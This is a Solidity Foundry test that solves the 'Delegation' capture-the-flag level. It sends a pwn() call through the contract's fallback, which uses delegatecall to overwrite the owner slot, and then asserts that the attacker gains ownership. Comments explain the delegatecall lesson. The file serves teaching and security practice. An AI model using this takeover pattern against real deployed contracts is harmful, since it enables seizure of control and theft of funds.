// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Delegation.sol";

/// @custom:win-condition 
// The goal of this level is for you to claim ownership of the instance you are given.

/// @custom:lesson-learned
// If contract A calls contract B with delegate call, contract B's code will be ran inside of A.
// This can be dangerous because it allows contract B's functions to modify A's state.

contract DelegationSolvedTest is Test {

  Delegation public s_delegation;
  Delegate public s_delegate;
  address payable s_user;

  function setUp() public {
    s_delegate = new Delegate(address(this));
    s_delegation = new Delegation(address(s_delegate));
    s_user = payable(vm.addr(1));
    vm.deal(s_user, 100000000 ether);
  }

  function testWinCondition() public {
    vm.startPrank(s_user);

    (bool success, ) = address(s_delegation).call(abi.encodeWithSignature("pwn()"));
    require(success, "fallback failed");

    assertEq(s_delegation.owner(), s_user);
  }
 
}